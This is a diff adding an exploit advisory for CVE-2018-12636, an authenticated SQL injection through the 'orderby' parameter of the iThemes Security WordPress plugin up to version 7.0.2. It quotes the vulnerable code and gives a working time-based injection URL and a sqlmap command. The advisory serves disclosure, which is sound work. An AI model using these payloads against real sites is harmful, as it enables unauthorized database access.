@@ -1,0 +1,41 @@
+# Exploit Title: WordPress Plugin iThemes Security(better-wp-security) <= 7.0.2 - Authenticated SQL Injection
+# Date: 2018-06-25
+# Exploit Author: Çlirim Emini
+
+# Website: https://www.sentry.co.com/
+# Vendor Homepage: https://ithemes.com/
+# Software Link: https://wordpress.org/plugins/better-wp-security/
+# Version/s: 7.0.2 and below
+# Patched Version: 7.0.3
+# CVE : 2018-12636
+# WPVULNDB: https://wpvulndb.com/vulnerabilities/9099
+
+Plugin description:
+
+iThemes Security works to lock down WordPress, fix common holes, stop automated attacks and strengthen user credentials. With advanced features for experienced users, this WordPress security plugin can help harden WordPress.
+
+Description:
+
+WordPress Plugin iThemes Security(better-wp-security) before 7.0.3 allows remote authenticated users to execute arbitrary SQL commands via the 'orderby' parameter in the 'itsec-logs' page to wp-admin/admin.php.
+
+Technical details:
+
+Parameter orderby is vulnerable because backend variable $sort_by_column
+is not escaped.
+
+File: better-wp-security/core/admin-pages/logs-list-table.php
+Line 271: if ( isset( $_GET[' orderby '], $_GET['order'] ) ) {
+Line 272: $ sort_by_column = $_GET[' orderby '];
+
+File: better-wp-security/core/lib/log-util.php
+Line 168: $query .= ' ORDER BY ' . implode( ', ', $ sort_by_column ));
+
+Proof of Concept (PoC):
+
+The following GET request will cause the SQL query to execute and sleep for 10 seconds if clicked on as an authenticated admin:
+
+http://localhost/wp-admin/admin.php?page=itsec-logs&filter=malware&orderby=remote_ip%2c(select*from(select(sleep(10)))a)&order=asc&paged=0
+
+Using SQLMAP:
+
+sqlmap -u 'http://localhost/wp-admin/admin.php?page=itsec-logs&filter=malware&orderby=remote_ip*&order=asc&paged=0' --cookie "wordpress_b...; wordpress_logged_in_bbf...;" --string "WordPress" --dbms=MySQL --technique T --level 5 --risk 3
